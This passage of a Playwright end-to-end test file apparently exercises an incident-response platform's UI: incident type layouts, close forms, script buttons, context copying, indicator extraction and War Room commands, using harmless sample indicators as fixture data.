/** Open a type of incident in its builder (Settings → Incidents → Types), on the part "Pages". */
async function openTypePages(name) {
  await page.goto('/settings/incidents/types')
  const settings = page.getByRole('region', { name: 'Settings' })
  await settings.getByRole('table', { name: 'Incident types' }).getByRole('button', { name, exact: true }).click()
  await expect(settings.locator('#type-name')).toHaveValue(name)
  await settings.getByRole('tab', { name: 'Pages' }).click()
  return settings
}

test('a type orders and hides the tabs of its incidents, and adds a page of its own', async () => {
  test.setTimeout(120_000)
  const before = page.url()
  const made = await page.request.post('/api/incident-types', { data: { name: 'E2E pages' } })
  expect(made.status(), await made.text()).toBe(201)
  const created = await page.request.post('/api/incidents', {
    data: { id: 'e2e-pages', name: 'E2E pages', host: 'E2E-PAGES', data: {} },
  })
  expect(created.status()).toBe(201)
  const typed = await page.request.patch('/api/incidents/e2e-pages/fields', {
    data: { changes: { type: 'e2e-pages' } },
  })
  expect(typed.status(), await typed.text()).toBe(200)

  // The tabs of the bar in their order, each saying what it is; the Summary is never hidden.
  const settings = await openTypePages('E2E pages')
  const tabsOf = settings.getByRole('region', { name: 'Tabs of the incident' })
  const rows = tabsOf.getByRole('listitem')
  await expect(rows).toHaveCount(7)
  await expect(rows.first()).toContainText('Summary')
  await expect(rows.first()).toContainText('page')
  await expect(rows.last()).toContainText('Evidence')
  await expect(rows.last()).toContainText('Nik')
  await expect(tabsOf.getByRole('button', { name: 'Hide Summary' })).toBeDisabled()
  // A tab of Nik is moved with the arrows (a grip drags it) and hidden with its eye.
  await tabsOf.getByRole('button', { name: 'Move Evidence up' }).click()
  await expect(rows.last()).toContainText('Timeline')
  await tabsOf.getByRole('button', { name: 'Hide Timeline' }).click()
  await expect(rows.last()).toContainText('Nik · hidden')
  await expect(tabsOf.getByRole('button', { name: 'Show Timeline' })).toBeVisible()

  // A page of its own: a name, and a grid arranged like the Summary's.
  await tabsOf.getByRole('button', { name: 'Add a page…' }).click()
  const naming = page.getByRole('dialog', { name: 'Add a page' })
  await naming.locator('#new-page-name').fill('Containment')
  await naming.getByRole('button', { name: 'Add the page' }).click()
  await expect(rows).toHaveCount(8)
  await expect(rows.last()).toContainText('Containment')
  await expect(rows.last()).toContainText('page · yours')
  const arranged = settings.getByRole('region', { name: 'The page' })
  await expect(arranged).toContainText('Page: Containment')
  await expect(arranged).toContainText('Nothing on this page yet')
  // What is on a page once is once on each page: the details are on the Summary and can be here too.
  await expect(arranged.locator('#page-add-kind').locator('option')).toContainText(['Incident details'])
  await arranged.locator('#page-add-kind').selectOption('note')
  await arranged.getByRole('button', { name: 'Add', exact: true }).click()
  await arranged.getByRole('button', { name: 'Edit A text' }).click()
  const widget = page.getByRole('dialog', { name: 'Widget: A text' })
  await widget.locator('#widget-text').fill('Isolate the host first.')
  await widget.getByRole('button', { name: 'Done' }).click()
  await arranged.locator('#page-add-kind').selectOption('linked')
  await arranged.getByRole('button', { name: 'Add', exact: true }).click()
  await expect(arranged.getByRole('article', { name: 'Linked incidents' })).toBeVisible()
  // Renamed, its tab is called by its new name; moved up, it comes right after the Summary.
  await arranged.locator('#page-name').fill('Containment plan')
  await expect(rows.last()).toContainText('Containment plan')
  const up = tabsOf.getByRole('button', { name: 'Move Containment plan up' })
  for (let step = 0; step < 6; step += 1) await up.click()
  await expect(rows.nth(1)).toContainText('Containment plan')
  await settings.getByRole('button', { name: 'Save the type' }).click()
  await expect(settings.getByText('not saved')).toHaveCount(0)
  const saved = (await (await page.request.get('/api/incident-types/e2e-pages')).json()).layout
  expect(saved.tabs).toEqual([
    'summary',
    'page:containment',
    'war_room',
    'work_plan',
    'context',
    'iocs',
    'evidence',
    'timeline',
  ])
  expect(saved.hidden).toEqual(['timeline'])
  expect(saved.pages).toHaveLength(1)
  expect(saved.pages[0]).toMatchObject({ id: 'containment', name: 'Containment plan' })
  expect(saved.pages[0].grid.map((item) => item.kind)).toEqual(['note', 'linked'])

  // The incident follows: its tabs in that order, the hidden one gone, the page a tab with its widgets.
  await page.goto('/incident/e2e-pages')
  const tabs = page.locator('nav[aria-label="Analysis tabs"]')
  await expect(tabs.getByRole('button', { name: 'Containment plan', exact: true })).toBeVisible()
  const names = await tabs
    .getByRole('button')
    .evaluateAll((items) => items.map((item) => item.getAttribute('aria-label')))
  expect(names).toEqual(['Summary', 'Containment plan', 'War Room', 'Work plan', 'Context', 'Indicators', 'Evidence'])
  await tabs.getByRole('button', { name: 'Containment plan', exact: true }).click()
  const shown = page.getByRole('region', { name: 'Containment plan of the incident' })
  await expect(shown.getByRole('article', { name: 'A text' })).toContainText('Isolate the host first.')
  await expect(shown.getByRole('article', { name: 'Linked incidents' })).toContainText(
    'No other incident is related to this one',
  )

  // Deleted in the type, the page leaves the incident; the tabs of Nik stay as they were ordered.
  const again = await openTypePages('E2E pages')
  await again
    .getByRole('region', { name: 'Tabs of the incident' })
    .getByRole('button', { name: 'Containment plan', exact: true })
    .click()
  await again.getByRole('region', { name: 'The page' }).getByRole('button', { name: 'Delete the page…' }).click()
  const deleting = page.getByRole('dialog', { name: 'Delete the page Containment plan?' })
  await deleting.getByRole('button', { name: 'Delete the page' }).click()
  await expect(again.getByRole('region', { name: 'Tabs of the incident' }).getByRole('listitem')).toHaveCount(7)
  await expect(again.getByRole('region', { name: 'The page' })).toContainText('Page: Summary')
  await again.getByRole('button', { name: 'Save the type' }).click()
  await expect(again.getByText('not saved')).toHaveCount(0)
  await page.goto('/incident/e2e-pages')
  await expect(tabs.getByRole('button', { name: 'Evidence', exact: true })).toBeVisible()
  await expect(tabs.getByRole('button', { name: 'Containment plan', exact: true })).toHaveCount(0)
  await expect(tabs.getByRole('button', { name: 'Timeline', exact: true })).toHaveCount(0)

  // Left as it was: the incident and the type are deleted.
  expect((await page.request.delete('/api/incidents/e2e-pages')).status()).toBe(204)
  expect((await page.request.delete('/api/incident-types/e2e-pages')).status()).toBe(204)
  await page.goto(before)
  await expect(page.locator('nav[aria-label="Analysis tabs"]').getByRole('button', { name: 'Summary' })).toBeEnabled()
})

test('the close form of a type shows its sections in the Close dialog; its quick view is a list of blocks', async () => {
  test.setTimeout(120_000)
  const before = page.url()
  const field = await page.request.post('/api/fields', {
    data: { name: 'e2e_reach', label: 'Mailboxes reached', type: 'number', allTypes: false },
  })
  expect(field.status(), await field.text()).toBe(201)
  const made = await page.request.post('/api/incident-types', {
    data: {
      name: 'E2E close',
      fields: [{ name: 'e2e_reach', requiredOnClose: true }],
      layout: {
        sections: [
          { id: 'key', title: 'Key facts', key: true, fields: ['status', 'severity', 'owner'] },
          { id: 'outcome', title: 'Outcome', columns: 2, fields: ['e2e_reach', 'category'] },
          { id: 'lessons', title: 'Lessons', fields: ['details'] },
        ],
      },
    },
  })
  expect(made.status(), await made.text()).toBe(201)
  const created = await page.request.post('/api/incidents', {
    data: { id: 'e2e-close', name: 'E2E close', host: 'E2E-CLOSE', data: {} },
  })
  expect(created.status()).toBe(201)
  const typed = await page.request.patch('/api/incidents/e2e-close/fields', {
    data: { changes: { type: 'e2e-close' } },
  })
  expect(typed.status(), await typed.text()).toBe(200)
  const task = await page.request.post('/api/incidents/e2e-close/tasks', { data: { title: 'Tell the user' } })
  expect(task.status(), await task.text()).toBe(201)

  // The close form: sections of the type, chosen and ordered; each says what it lets one edit.
  const settings = await openTypePages('E2E close')
  const views = settings.getByRole('region', { name: 'Other views of this type' })
  await expect(views).toContainText('as it always was')
  await expect(views).toContainText('generated')
  await views.getByRole('button', { name: 'Close form' }).click()
  const form = settings.getByRole('region', { name: 'Close form' })
  const offered = form.getByRole('list', { name: 'Sections to add to the close form' })
  await offered.getByRole('button', { name: 'Outcome' }).click()
  await offered.getByRole('button', { name: 'Lessons' }).click()
  const chosen = form.getByRole('list', { name: 'Sections of the close form' }).getByRole('listitem')
  await expect(chosen).toHaveCount(2)
  await expect(chosen.first()).toContainText('Outcome')
  await expect(chosen.first()).toContainText('2 fields, 1 to close')
  await form.getByRole('button', { name: 'Move Lessons up in the close form' }).click()
  await expect(chosen.first()).toContainText('Lessons')
  await expect(views).toContainText('2 sections')
  // The quick view: blocks one under the other, a kind that is there once offered once.
  await views.getByRole('button', { name: 'Quick view' }).click()
  const quick = settings.getByRole('region', { name: 'Quick view' })
  await expect(quick).toContainText('This type has none of its own')
  await quick.locator('#quick-add-kind').selectOption('timers')
  await quick.getByRole('button', { name: 'Add', exact: true }).click()
  await quick.locator('#quick-add-kind').selectOption('note')
  await quick.getByRole('button', { name: 'Add', exact: true }).click()
  await quick.getByLabel('Text of block 2').fill('Call the owner of the mailbox.')
  await quick.getByRole('button', { name: 'Move block 2 up' }).click()
  await expect(quick.getByRole('list', { name: 'Blocks of the quick view' }).getByRole('listitem')).toHaveCount(2)
  await expect(quick.locator('#quick-add-kind').locator('option')).not.toContainText(['Timers'])
  await expect(views).toContainText('2 blocks')
  await settings.getByRole('button', { name: 'Save the type' }).click()
  await expect(settings.getByText('not saved')).toHaveCount(0)
  const saved = (await (await page.request.get('/api/incident-types/e2e-close')).json()).layout
  expect(saved.close).toEqual({ sections: ['lessons', 'outcome'] })
  expect(saved.quick).toEqual([{ kind: 'note', text: 'Call the owner of the mailbox.' }, { kind: 'timers' }])

  // Closing an incident of the type: the sections with their fields, and what is left of the work plan.
  await page.goto('/incident/e2e-close')
  const tabs = page.locator('nav[aria-label="Analysis tabs"]')
  const details = page.getByRole('article', { name: 'Incident details' })
  const askToClose = async () => {
    await tabs.getByRole('button', { name: 'Summary', exact: true }).click()
    await details.getByRole('button', { name: 'Edit the incident' }).click()
    const editing = page.getByRole('dialog', { name: 'Edit the incident' })
    await editing.locator('#incident-status').selectOption('closed')
    await editing.getByRole('button', { name: 'Save', exact: true }).click()
  }
  await askToClose()
  const closing = page.getByRole('dialog', { name: 'Close the incident' })
  await expect(closing).toContainText('E2E close · the form of its type')
  await expect(closing.locator('fieldset legend')).toHaveText(['Section · Lessons', 'Section · Outcome'])
  await expect(closing.getByRole('group', { name: 'Section Outcome' })).toContainText('Mailboxes reached · required')
  await expect(closing.getByRole('status')).toHaveText('1 task of the work plan is still open.')
  // "Show them" leaves the dialog for the work plan; nothing was closed.
  await closing.getByRole('button', { name: 'Show them' }).click()
  await expect(closing).toHaveCount(0)
  await expect(tabs.getByRole('button', { name: 'Work plan', exact: true })).toHaveAttribute('aria-current', 'page')
  await expect(page.getByText('Tell the user').first()).toBeVisible()
  await askToClose()
  await closing.locator('#close-reason').selectOption('Resolved')
  await closing.locator('#close-field-details').fill('Add the sender pattern to the rule.')
  await closing.getByRole('button', { name: 'Close the incident' }).click()
  await expect(closing.getByRole('alert')).toHaveText('Mailboxes reached is needed to close')
  await closing.locator('#close-field-e2e_reach').fill('14')
  await closing.locator('#close-field-category').fill('phishing')
  await closing.getByRole('button', { name: 'Close the incident' }).click()
  await expect(closing).toHaveCount(0)
  await expect(details).toContainText('closed')
  const held = (await (await page.request.get('/api/incidents/e2e-close/fields')).json()).fields
  expect([held.status, held.close_reason, held.e2e_reach, held.category, held.details]).toEqual([
    'closed',
    'Resolved',
    14,
    'phishing',
    'Add the sender pattern to the rule.',
  ])

  // Left as it was: the task done, the incident, the type and the field deleted.
  const done = await page.request.post(`/api/tasks/${(await task.json()).id}/complete`, { data: {} })
  expect([200, 409]).toContain(done.status())
  expect((await page.request.delete('/api/incidents/e2e-close')).status()).toBe(204)
  expect((await page.request.delete('/api/incident-types/e2e-close')).status()).toBe(204)
  expect((await page.request.delete('/api/fields/e2e_reach')).status()).toBe(204)
  await page.goto(before)
  await expect(page.locator('nav[aria-label="Analysis tabs"]').getByRole('button', { name: 'Summary' })).toBeEnabled()
})

test('a script button of a page runs a script on the incident: one argument asked, one filled from a field', async () => {
  test.setTimeout(180_000)
  const before = page.url()
  // The sandbox runs in CI (and wherever E2E_SANDBOX_URL names one); without it a run says why it failed.
  const sandbox = Boolean(process.env.E2E_SANDBOX_URL)
  const made = await page.request.post('/api/incident-types', { data: { name: 'E2E buttons' } })
  expect(made.status(), await made.text()).toBe(201)
  const created = await page.request.post('/api/incidents', {
    data: { id: 'e2e-button', name: 'E2E button', host: 'E2E-BUTTON', data: {} },
  })
  expect(created.status()).toBe(201)
  const typed = await page.request.patch('/api/incidents/e2e-button/fields', {
    data: { changes: { type: 'e2e-buttons', affected_hosts: ['name;office', 'anna;rome'] } },
  })
  expect(typed.status(), await typed.text()).toBe(200)

  // The settings of a button, in the page of the type: its text, its colours, its script, its arguments.
  const settings = await openTypePages('E2E buttons')
  const arranged = settings.getByRole('region', { name: 'The page' })
  await expect(arranged.locator('#page-add-kind').locator('option')).not.toContainText(['Playbook buttons'])
  await arranged.locator('#page-add-kind').selectOption('buttons')
  await arranged.getByRole('button', { name: 'Add', exact: true }).click()
  await arranged.getByRole('button', { name: 'Edit Script buttons' }).click()
  const widget = page.getByRole('dialog', { name: 'Widget: Script buttons' })
  await widget.getByRole('button', { name: 'Add a button' }).click()
  await widget.locator('#button-label').fill('Split the rows')
  // The colours are free; a text that is hard to read on its button is said, and saved all the same.
  await widget.locator('#button-background').fill('#777777')
  await widget.locator('#button-color').fill('#ffffff')
  const contrast = widget.getByLabel('Contrast of the button')
  await expect(contrast).toHaveAttribute('role', 'alert')
  await expect(contrast).toContainText('Contrast 4.4 : 1.')
  await expect(contrast).toContainText('hard to read')
  await widget.locator('#button-background').fill('#8b1a1a')
  await expect(contrast).toHaveText('Contrast 9.2 : 1.')
  await expect(widget.getByRole('img', { name: 'The button as drawn: Split the rows' })).toHaveCSS(
    'background-color',
    'rgb(139, 26, 26)',
  )
  // A script with a saved version, then one input for each of its arguments.
  await widget.locator('#button-script').selectOption('CsvToList')
  await expect(widget.locator('#button-arg-delimiter')).toHaveAttribute(
    'placeholder',
    'left empty: asked when the button is pressed',
  )
  // Typing {{ offers the fields of the type; the one chosen completes what was typed.
  await widget.locator('#button-arg-text').pressSequentially('{{')
  const picker = page.getByRole('dialog', { name: 'Pick a value' })
  await picker.getByLabel('Find a value').fill('affected hosts')
  await picker.getByRole('button', { name: /^affected_hosts/ }).click()
  await expect(widget.locator('#button-arg-text')).toHaveValue('{{ affected_hosts }}')
  await widget.getByRole('button', { name: 'Done' }).click()
  await expect(arranged.getByRole('article', { name: 'Script buttons' })).toContainText('Split the rows')
  await settings.getByRole('button', { name: 'Save the type' }).click()
  await expect(settings.getByText('not saved')).toHaveCount(0)
  const saved = (await (await page.request.get('/api/incident-types/e2e-buttons')).json()).layout
  expect(saved.grid.at(-1).buttons).toEqual([
    {
      label: 'Split the rows',
      background: '#8b1a1a',
      color: '#ffffff',
      script: 'CsvToList',
      args: { text: '{{ affected_hosts }}' },
    },
  ])

  // On the incident: the button drawn with its colours. Pressed, what is filled is shown and what is not is asked.
  await page.goto('/incident/e2e-button')
  const buttons = page.getByRole('article', { name: 'Script buttons' })
  const button = buttons.getByRole('button', { name: 'Split the rows' })
  await expect(button).toHaveCSS('background-color', 'rgb(139, 26, 26)')
  await expect(button).toHaveCSS('color', 'rgb(255, 255, 255)')
  await button.click()
  const press = page.getByRole('dialog', { name: 'Split the rows' })
  // The field holds two values: one run for each.
  await expect(press.getByRole('group', { name: 'text, from Affected hosts · 2 values' })).toHaveText(
    '2 runs, one for each value',
  )
  await expect(press).toContainText('delimiter · to fill')
  await press.locator('#run-arg-delimiter').fill(';')
  await press.getByRole('button', { name: 'Run 2 times' }).click()
  // The same dialog lists the runs as they finish.
  const running = page.getByRole('dialog', { name: 'Split the rows · 2 runs' })
  const runs = running.getByRole('list', { name: 'Runs' }).getByRole('listitem')
  await expect(runs).toHaveCount(2)
  await expect(runs.first()).toContainText('name;office')
  if (sandbox) {
    await expect(runs.first()).toContainText('done', { timeout: 60_000 })
    await expect(runs.last()).toContainText('done', { timeout: 60_000 })
    await expect(running.getByRole('status')).toHaveText('The 2 runs are done.')
  } else {
    await expect(runs.first()).toContainText('failed', { timeout: 60_000 })
    await runs.first().getByRole('button', { name: 'show why' }).click()
    await expect(runs.first().getByRole('note')).toContainText('sandbox')
    await expect(running.getByRole('button', { name: 'Run the 2 failed ones again' })).toBeVisible({ timeout: 60_000 })
  }
  await running.getByRole('button', { name: 'Done' }).click()
  await expect(running).toHaveCount(0)

  // Each run is a command of the War Room, with its arguments, and a line of the audit log.
  const commands = (await (await page.request.get('/api/incidents/e2e-button/war-room?show=commands')).json()).entries
  expect(commands.map((entry) => [entry.body.button, entry.body.line])).toEqual([
    ['Split the rows', '!CsvToList delimiter=; text=name;office'],
    ['Split the rows', '!CsvToList delimiter=; text=anna;rome'],
  ])
  if (sandbox) {
    const results = (await (await page.request.get('/api/incidents/e2e-button/war-room?show=automation')).json())
      .entries
    const first = results.find((entry) => entry.parentId === commands[0].id)
    const detail = await (await page.request.get(`/api/incidents/e2e-button/war-room/${first.id}`)).json()
    expect(detail.step.output).toMatchObject({ columns: ['name', 'office'], count: 0 })
  }
  const audited = (await (await page.request.get('/api/audit?incidentId=e2e-button')).json()).entries
  expect(
    audited
      .filter((entry) => entry.action === 'button.run')
      .map((entry) => entry.details)
      .sort(),
  ).toEqual([
    'Pressed "Split the rows": ran CsvToList for anna;rome (2 of 2)',
    'Pressed "Split the rows": ran CsvToList for name;office (1 of 2)',
  ])

  // Left as it was: the incident and the type are deleted.
  expect((await page.request.delete('/api/incidents/e2e-button')).status()).toBe(204)
  expect((await page.request.delete('/api/incident-types/e2e-buttons')).status()).toBe(204)
  await page.goto(before)
  await expect(page.locator('nav[aria-label="Analysis tabs"]').getByRole('button', { name: 'Summary' })).toBeEnabled()
})

test('the Context tab shows what playbooks read of the incident, with the path of each value', async () => {
  const tabs = page.locator('nav[aria-label="Analysis tabs"]')
  const tree = page.getByRole('tree', { name: 'Context of the incident' })
  // The incident may still be settling on the tab its type remembers (the test before changed its type).
  await expect(async () => {
    await tabs.getByRole('button', { name: 'Context', exact: true }).click()
    await expect(tree).toBeVisible({ timeout: 2000 })
  }).toPass()
  // Two roots: the fields of the incident, and what the analysis found for it.
  await expect(tree.getByRole('treeitem', { name: /^incident/ }).first()).toBeVisible()
  await expect(tree.getByRole('treeitem', { name: /^File \d+ items?$/ })).toBeVisible()
  await tree
    .getByRole('treeitem', { name: /^File \d+ items?$/ })
    .getByRole('button')
    .click()
  await tree
    .getByRole('treeitem', { name: /^File \d+ items?$/ })
    .getByRole('button')
    .click()
  await tree
    .getByRole('treeitem', { name: /^0 \d+$/ })
    .first()
    .getByRole('button')
    .click()
  const hash = tree.getByRole('treeitem', { name: /^SHA256 [0-9a-f]{64}$/ }).first()
  await hash.getByRole('button').click()
  const chosen = page.getByLabel('The chosen value')
  await expect(chosen).toContainText('{{ context.File[0].SHA256 }}')
  await expect(chosen).toContainText('${context.File[0].SHA256}')
  await expect(chosen).toContainText("Set by Nik's analysis")
  // A search keeps what matches, with what leads to it.
  await page.getByPlaceholder('Find a key or a value…').fill('WKS-FINANCE-01')
  await expect(tree.getByRole('treeitem', { name: /^host WKS-FINANCE-01$/ })).toBeVisible()
  await expect(tree.getByRole('treeitem', { name: /^SHA256/ })).toHaveCount(0)
  await tabs.getByRole('button', { name: 'Summary', exact: true }).click()
})

test('a value and its path are copied from the context, a text is made indicators, and what was found can be removed', async () => {
  test.setTimeout(120_000)
  const before = page.url()
  await page.context().grantPermissions(['clipboard-read', 'clipboard-write'])
  const clipboard = () => page.evaluate(() => navigator.clipboard.readText())
  // An incident of its own, whose name holds a domain and a private address: read as it is made.
  const made = await page.request.post('/api/incidents', {
    data: { id: 'e2e-found', name: 'Beacon to e2e-found-site.com from 10.1.2.3', host: 'E2E-FOUND', data: {} },
  })
  expect(made.status(), await made.text()).toBe(201)
  const found = await (await page.request.get('/api/incidents/e2e-found/iocs/found')).json()
  expect(found.found.map((row) => [row.type, row.value, row.path, row.door])).toEqual([
    ['domain', 'e2e-found-site.com', 'incident.name', 'hand'],
  ])
  expect(found.scan.leftOut).toEqual({ private: 1 })
  await page.goto('/incident/e2e-found')
  const tabs = page.locator('nav[aria-label="Analysis tabs"]')

  // The Context tab: a value is text the mouse selects, and the chosen one is copied whole.
  const tree = page.getByRole('tree', { name: 'Context of the incident' })
  await expect(async () => {
    await tabs.getByRole('button', { name: 'Context', exact: true }).click()
    await expect(tree).toBeVisible({ timeout: 2000 })
  }).toPass()
  const host = tree.getByRole('treeitem', { name: /^host E2E-FOUND$/ })
  // On its first letters: the cell of the value is as wide as the row.
  await host.getByText('E2E-FOUND').dblclick({ position: { x: 6, y: 6 } })
  expect(await page.evaluate(() => window.getSelection().toString())).toContain('E2E')
  await page.evaluate(() => window.getSelection().removeAllRanges())
  const chosen = page.getByLabel('The chosen value')
  await expect(chosen.getByLabel('The value, whole')).toHaveText('E2E-FOUND')
  await chosen.getByRole('button', { name: 'Copy the value' }).click()
  await expect(page.getByRole('status').filter({ hasText: 'Value copied.' })).toBeVisible()
  expect(await clipboard()).toBe('E2E-FOUND')
  await chosen.getByRole('button', { name: 'Copy the path', exact: true }).click()
  expect(await clipboard()).toBe('{{ incident.host }}')
  await chosen.getByRole('button', { name: 'Copy the path for the command line' }).click()
  expect(await clipboard()).toBe('${incident.host}')
  // With the keyboard: the arrows move, Ctrl C copies the value of the row.
  await host.getByRole('button').focus()
  await page.keyboard.press('ArrowUp')
  await page.keyboard.press('ArrowDown')
  await page.keyboard.press('Control+c')
  await expect.poll(clipboard).toBe('E2E-FOUND')
  // The right click of a row copies too; a branch is copied as JSON.
  await tree
    .getByRole('treeitem', { name: /^name Beacon to/ })
    .getByRole('button')
    .click({ button: 'right' })
  await page.getByRole('menu').getByRole('menuitem', { name: 'Copy the path', exact: true }).click()
  expect(await clipboard()).toBe('{{ incident.name }}')
  await tree
    .getByRole('treeitem', { name: /^incident \d+$/ })
    .getByRole('button')
    .click()
  await chosen.getByRole('button', { name: 'Copy the value' }).click()
  await expect.poll(async () => JSON.parse(await clipboard()).name).toBe('Beacon to e2e-found-site.com from 10.1.2.3')
  await tree
    .getByRole('treeitem', { name: /^incident \d+$/ })
    .getByRole('button')
    .click()

  // The War Room says once what was found, and its command line makes indicators of a text.
  await tabs.getByRole('button', { name: 'War Room', exact: true }).click()
  const stream = page.getByRole('list', { name: 'War Room' })
  await expect(stream.getByText('1 indicator found: 1 domain; 1 left out as private.')).toHaveCount(1)
  const line = page.locator('#war-room-line')
  await line.fill('!nik-make-indicators text="hxxp://e2e-made-site[.]net/gate.php kernel32.dll"')
  await line.press('Enter')
  const result = stream.getByRole('listitem').filter({ hasText: /^automation.*nik-make-indicators/ })
  await expect(result).toHaveCount(1, { timeout: 20_000 })
  await result.getByRole('button').first().click()
  const inspector = page.getByRole('complementary', { name: 'The chosen entry' })
  await expect(inspector).toContainText('http://e2e-made-site.net/gate.php')
  // What a step gave is copied whole with its button.
  await inspector.getByRole('button', { name: 'Copy the result' }).click()
  await expect.poll(async () => JSON.parse(await clipboard()).linked).toBe(2)
  await inspector.getByRole('button', { name: 'Close the entry' }).click()

  // The Indicators tab: the two that were made, the one that was found with where, which can be removed.
  await tabs.getByRole('button', { name: 'Indicators', exact: true }).click()
  await expect(page.getByRole('row').filter({ hasText: 'e2e-found-site.com' })).toContainText('Found · incident.name')
  await expect(page.getByRole('row').filter({ hasText: 'http://e2e-made-site.net/gate.php' })).toHaveCount(1)
  const byItself = page.getByLabel('Indicators found by themselves')
  await expect(byItself).toContainText('Found by themselves: 1.')
  await page.getByRole('button', { name: 'Remove e2e-found-site.com from this incident' }).click()
  await expect(page.getByRole('status').filter({ hasText: 'It will not be found again here.' })).toBeVisible()
  await expect(byItself).toContainText('Found by themselves: 0.')
  await expect(byItself).toContainText('Removed, and not found again: 1')
  // Asked for again, it stays removed.
  await byItself.getByRole('button', { name: 'Find indicators now' }).click()
  await expect(page.getByRole('status').filter({ hasText: 'The incident was read for indicators.' })).toBeVisible()
  await expect(byItself).toContainText('Found by themselves: 0.')
  const held = (await (await page.request.get('/api/incidents/e2e-found/iocs')).json()).iocs
  expect(held.map((item) => `${item.type} ${item.value}`).sort()).toEqual([
    'domain e2e-made-site.net',
    'url http://e2e-made-site.net/gate.php',
  ])

  // Left as it was.
  expect((await page.request.delete('/api/incidents/e2e-found')).status()).toBe(204)
  await page.goto(before)
  // On the Summary, as the test before left it: the page was loaded again, and the next test goes
  // back to a Summary that is already there.
  await tabs.getByRole('button', { name: 'Summary', exact: true }).click()
  await expect(page.getByRole('region', { name: 'Summary of the incident' })).toBeVisible()
})

test('the War Room holds what was said and done on the incident, and marks evidence', async () => {
  const tabs = page.locator('nav[aria-label="Analysis tabs"]')
  await tabs.getByRole('button', { name: 'War Room', exact: true }).click()
  const stream = page.getByRole('list', { name: 'War Room' })
  // What the playbook of an earlier test did here is in it: its steps, the approval, the note it wrote.
  await expect(stream.getByText('Approved by admin: looks right')).toBeVisible()
  await expect(
    stream
      .getByText('Ask first: go ahead?')
      .or(stream.getByText(/^Add a note to/))
      .first(),
  ).toBeVisible()

  // Plain text written below is a note of the incident.
  await page.locator('#war-room-line').fill('Laptop collected from the finance office.')
  await page.locator('#war-room-line').press('Enter')
  const note = stream.getByRole('listitem').filter({ hasText: 'Laptop collected from the finance office.' })
  await expect(note).toHaveCount(1)
  await expect(page.locator('#war-room-line')).toHaveValue('')

  // The chips keep one kind.
  const show = page.getByRole('group', { name: 'Show' })
  await show.getByRole('button', { name: 'Automation' }).click()
  await expect(note).toHaveCount(0)
  const step = stream.getByRole('listitem').filter({ hasText: 'playbook Ask then note' }).first()
  await expect(step).toBeVisible()
  // The inspector shows what the step was given and gave, and opens its run.
  await step.getByRole('button', { name: /^automation/ }).click()
  const inspector = page.getByRole('complementary', { name: 'The chosen entry' })
  await expect(inspector.getByRole('heading', { name: 'Result' })).toBeVisible()
  await expect(inspector.getByRole('heading', { name: 'What it was given' })).toBeVisible()
  await expect(inspector.getByRole('button', { name: 'Open the run' })).toBeVisible()
  await inspector.getByRole('button', { name: 'Close the entry' }).click()

  // An entry marked as evidence is found among the evidence.
  await show.getByRole('button', { name: 'Notes' }).click()
  await note.getByRole('button').first().click()
  await inspector.getByRole('button', { name: 'Mark as evidence' }).click()
  await expect(note).toContainText('evidence')
  await show.getByRole('button', { name: 'Evidence' }).click()
  await expect(stream.getByRole('listitem').filter({ hasText: /\S/ })).toHaveCount(1)
  await expect(note).toHaveCount(1)
  // It is a note of the incident like any other: the Summary shows it.
  await tabs.getByRole('button', { name: 'Summary', exact: true }).click()
  await expect(page.getByText('Laptop collected from the finance office.')).toBeVisible()
})

test('the command line of the War Room runs commands, asks before a change outside, and closes', async () => {
  test.setTimeout(120_000)
  const tabs = page.locator('nav[aria-label="Analysis tabs"]')
  await tabs.getByRole('button', { name: 'War Room', exact: true }).click()
  const stream = page.getByRole('list', { name: 'War Room' })
  const line = page.locator('#war-room-line')
  await page.getByRole('group', { name: 'Show' }).getByRole('button', { name: 'All' }).click()

  // The name of a command is completed while it is typed, and its arguments are hinted.
  await line.fill('!nik-get-ind')
  const offered = page.getByRole('listbox', { name: 'Commands' })
  await expect(offered.getByRole('option')).toHaveText([/!nik-get-indicator/])
  await line.press('Tab')
  await expect(line).toHaveValue('!nik-get-indicator ')
  await expect(page.getByLabel('Arguments of the command')).toContainText('value=')
  await line.pressSequentially('185.220.101.47')
  await line.press('Enter')
  // The command, and under it what it gave.
  const command = stream.getByRole('listitem').filter({ hasText: '!nik-get-indicator 185.220.101.47' })
  await expect(command).toHaveCount(1)
  const result = stream.getByRole('listitem').filter({ hasText: /^automation.*nik-get-indicator/ })
  await expect(result).toHaveCount(1, { timeout: 20_000 })
  await result.getByRole('button').first().click()
  const inspector = page.getByRole('complementary', { name: 'The chosen entry' })
  await expect(inspector.getByRole('heading', { name: 'Result' })).toBeVisible()
  await expect(inspector).toContainText('185.220.101.47')
  await inspector.getByRole('button', { name: 'Close the entry' }).click()
  // An address in the stream is the indicator: it opens its window.
  await command.getByRole('button', { name: '185.220.101.47' }).click()
  const indicator = page.getByRole('dialog', { name: 'Indicator' })
  await expect(indicator).toContainText('185.220.101.47')
  await page.keyboard.press('Escape')
  await expect(indicator).toBeHidden()

  // What is wrong with a line is said under it, and nothing runs.
  await line.fill('!nik-get-indicator colour=red')
  await line.press('Enter')
  await expect(page.getByRole('alert').filter({ hasText: 'is not an argument of this command' })).toBeVisible()
  // The arrow brings back the line typed before.
  await line.fill('')
  await line.press('ArrowUp')
  await expect(line).toHaveValue('!nik-get-indicator 185.220.101.47')
  await line.press('ArrowDown')
  await expect(line).toHaveValue('')

  // A command that changes something outside asks first, with the line as it will be sent.
  await line.fill('!acme-create-ticket title="From the War Room"')
  await line.press('Enter')
  const confirm = page.getByRole('dialog', { name: 'Run this command?' })
  await expect(confirm).toContainText('acme-create-ticket changes something outside Nik')
  await expect(confirm).toContainText('!acme-create-ticket title="From the War Room"')
  await confirm.getByRole('button', { name: 'Cancel' }).click()
  await expect(stream.getByRole('listitem').filter({ hasText: '!acme-create-ticket' })).toHaveCount(0)

  // A slash command: /close opens the form of closing.
  await line.fill('/cl')
  await expect(page.getByRole('listbox', { name: 'Commands' }).getByRole('option')).toHaveText([/\/close/])
  await line.press('Tab')
  await line.press('Enter')
  const closing = page.getByRole('dialog', { name: 'Close the incident' })
  await expect(closing).toBeVisible()
  await closing.getByRole('button', { name: 'Cancel' }).click()
  await tabs.getByRole('button', { name: 'Summary', exact: true }).click()
})

test('the Playground is the War Room without an incident: a command, a note, the history cleared', async () => {
  test.setTimeout(90_000)
  const before = (await (await page.request.get('/api/incidents')).json()).incidents.length
  await page.getByRole('button', { name: 'Playground', exact: true }).click()
  await expect(page).toHaveURL(/\/playground$/)
  const room = page.getByRole('region', { name: 'Playground' })
  const stream = room.getByRole('list', { name: 'Playground' })
  const line = room.locator('#playground-line')
  await expect(stream).toContainText('Nothing here yet')
